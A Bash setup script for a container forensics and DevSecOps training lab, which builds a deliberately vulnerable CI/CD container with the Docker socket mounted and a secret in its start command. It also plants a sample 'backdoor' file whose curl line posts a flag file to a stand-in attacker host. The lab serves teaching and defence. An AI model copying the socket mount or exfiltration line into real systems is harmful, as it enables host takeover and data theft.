#!/bin/bash
# ==============================================================================
# Killercoda Background Setup Script
# DevSecOps & Container DFIR Workshop - CPIFP Alan Turing
# ==============================================================================

exec > /var/log/killercoda_background.log 2>&1
set -x

# Remove any stale markers
rm -f /tmp/killercoda_ready /tmp/killercoda_failed

# Error handling trap
cleanup_trap() {
    EXIT_CODE=$?
    if [ "${EXIT_CODE}" -ne 0 ]; then
        echo "[ERROR] background.sh failed with exit code ${EXIT_CODE} at line ${BASH_LINENO[0]}!"
        touch /tmp/killercoda_failed
    fi
}
trap cleanup_trap EXIT ERR

echo "[$(date -u '+%Y-%m-%dT%H:%M:%SZ')] [INIT] Starting Killercoda background setup..."

# 1. Ensure Docker daemon is active and responsive
echo "[INIT] Verifying Docker daemon readiness..."
systemctl start docker || service docker start || true

DOCKER_RETRIES=40
until docker info >/dev/null 2>&1 || [ ${DOCKER_RETRIES} -le 0 ]; do
    echo "[DOCKER] Awaiting Docker daemon responsiveness (${DOCKER_RETRIES} attempts remaining)..."
    sleep 1
    DOCKER_RETRIES=$((DOCKER_RETRIES - 1))
done

if ! docker info >/dev/null 2>&1; then
    echo "[FATAL] Docker daemon is unreachable after timeout."
    exit 1
fi

# 2. Update package repositories and install required tools non-interactively
echo "[APT] Installing YARA and jq..."
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y --no-install-recommends yara jq

# 3. Create Host Root Flag for Challenge 2
echo "[FLAG] Provisioning Host Root Flag..."
echo "FLAG{host_takeover_via_docker_socket_alan_turing_2026}" > /root/host_flag.txt
chmod 600 /root/host_flag.txt

# 4. Synchronize assets and evidence directories
echo "[ASSETS] Preparing scenario paths..."
mkdir -p /assets/victim /assets/evidence /evidence /root/assets

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Copy from scenario assets directory if present
if [ -d "${SCRIPT_DIR}/assets" ]; then
    cp -ru "${SCRIPT_DIR}/assets/"* /assets/ 2>/dev/null || true
fi

# Copy from /root/assets if Killercoda placed assets there
if [ -d "/root/assets" ] && [ "$(ls -A /root/assets 2>/dev/null)" ]; then
    cp -ru /root/assets/* /assets/ 2>/dev/null || true
fi

# Fallback: Generate victim pipeline runner if missing
if [ ! -f "/assets/victim/pipeline_runner.sh" ]; then
    echo "[FALLBACK] Generating pipeline_runner.sh..."
    cat << 'EOF' > /assets/victim/pipeline_runner.sh
#!/bin/sh
echo "========================================================"
echo "[CI/CD Pipeline Daemon] Initializing worker agent..."
echo "[CI/CD Pipeline Daemon] Worker ID: runner-prod-eu-west-01"
echo "[CI/CD Pipeline Daemon] Organization: CPIFP Alan Turing"
echo "[CI/CD Pipeline Daemon] PID: $$"
echo "========================================================"
trap "echo '[CI/CD Daemon] Received shutdown signal. Terminating.'; exit 0" SIGINT SIGTERM
echo "[CI/CD Pipeline Daemon] Worker agent initialized. Listening for jobs..."
while true; do
    echo "[$(date -u '+%Y-%m-%dT%H:%M:%SZ')] [CI/CD Worker] Queue status: IDLE. Ready for webhook triggers."
    sleep 15
done
EOF
fi
chmod 755 /assets/victim/pipeline_runner.sh

# Fallback: Generate Dockerfile if missing
if [ ! -f "/assets/victim/Dockerfile" ]; then
    echo "[FALLBACK] Generating victim Dockerfile..."
    cat << 'EOF' > /assets/victim/Dockerfile
FROM alpine:3.19
RUN apk update && \
    apk add --no-cache docker-cli bash curl procps coreutils binutils
WORKDIR /app
COPY pipeline_runner.sh /app/pipeline_runner.sh
RUN chmod 755 /app/pipeline_runner.sh
RUN addgroup -g 10001 -S cicdgroup && \
    adduser -u 10001 -S cicduser -G cicdgroup
ENTRYPOINT ["/bin/sh", "-c", "DEPLOY_PRODUCTION_KEY='FLAG{supply_chain_credential_leaked_proc_2026}' exec /app/pipeline_runner.sh"]
EOF
fi

# Fallback: Generate docker-compose.yml if missing
if [ ! -f "/assets/docker-compose.yml" ]; then
    echo "[FALLBACK] Generating docker-compose.yml..."
    cat << 'EOF' > /assets/docker-compose.yml
version: '3.8'

services:
  cicd_runner_pipeline:
    container_name: cicd_runner_pipeline
    image: alan-turing/cicd-runner:vulnerable
    build:
      context: ./victim
      dockerfile: Dockerfile
    restart: unless-stopped
    environment:
      - RUNNER_NAME=worker-01
      - RUNNER_ORGANIZATION=AlanTuring-SecOps
      - CI_ENVIRONMENT=production
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
EOF
fi

# Fallback: Generate backdoor implant if missing
if [ ! -f "/evidence/backdoor_implant.sh" ]; then
    if [ -f "/assets/evidence/backdoor_implant.sh" ]; then
        cp /assets/evidence/backdoor_implant.sh /evidence/backdoor_implant.sh
    else
        echo "[FALLBACK] Generating backdoor_implant.sh..."
        cat << 'EOF' > /evidence/backdoor_implant.sh
#!/bin/sh
# Malicious Exfiltration Hook
curl -X POST -d @/root/host_flag.txt http://evil-c2.attacker.internal/exfil
EOF
    fi
fi
chmod 755 /evidence/backdoor_implant.sh
cp -u /evidence/backdoor_implant.sh /assets/evidence/backdoor_implant.sh 2>/dev/null || true

# Symlink /root/assets and /assets for consistent resolution
ln -sfn /assets /root/assets 2>/dev/null || true

# Synchronize verification scripts to /step1/, /step2/, /step3/, /step4/
for i in 1 2 3 4; do
    mkdir -p "/step${i}"
    if [ -f "${SCRIPT_DIR}/step${i}/verify.sh" ]; then
        cp "${SCRIPT_DIR}/step${i}/verify.sh" "/step${i}/verify.sh"
    elif [ -f "/assets/step${i}/verify.sh" ]; then
        cp "/assets/step${i}/verify.sh" "/step${i}/verify.sh"
    fi
    chmod +x "/step${i}/verify.sh" 2>/dev/null || true
done

# 5. Pre-pull alpine image to accelerate Challenge 2 breakout
echo "[DOCKER] Pre-pulling alpine image..."
docker pull alpine:3.19 || docker pull alpine:latest || true

# 6. Build victim container image
echo "[DOCKER] Building CI/CD runner victim image..."
docker build -t alan-turing/cicd-runner:vulnerable /assets/victim

# 7. Launch vulnerable container infrastructure
echo "[COMPOSE] Starting container stack..."
if docker compose version >/dev/null 2>&1; then
    docker compose -f /assets/docker-compose.yml up -d
else
    docker-compose -f /assets/docker-compose.yml up -d
fi

# 8. Wait for container to be ready
echo "[WAIT] Waiting for cicd_runner_pipeline container..."
MAX_RETRIES=30
COUNT=0
until [ "$(docker inspect -f '{{.State.Running}}' cicd_runner_pipeline 2>/dev/null)" = "true" ]; do
    sleep 1
    COUNT=$((COUNT + 1))
    if [ "${COUNT}" -ge "${MAX_RETRIES}" ]; then
        echo "[FATAL] Timeout waiting for cicd_runner_pipeline to start."
        exit 1
    fi
done

# 9. Inject forensic artifact into container's writable overlay layer
echo "[DFIR] Injecting forensic implant into container..."
docker exec cicd_runner_pipeline mkdir -p /var/log/pipeline_audit/
docker cp /evidence/backdoor_implant.sh cicd_runner_pipeline:/var/log/pipeline_audit/backdoor_implant.sh
docker exec cicd_runner_pipeline chmod 755 /var/log/pipeline_audit/backdoor_implant.sh

# 10. Drop completion marker for foreground script
echo "[READY] Background provisioning completed successfully."
touch /tmp/killercoda_ready
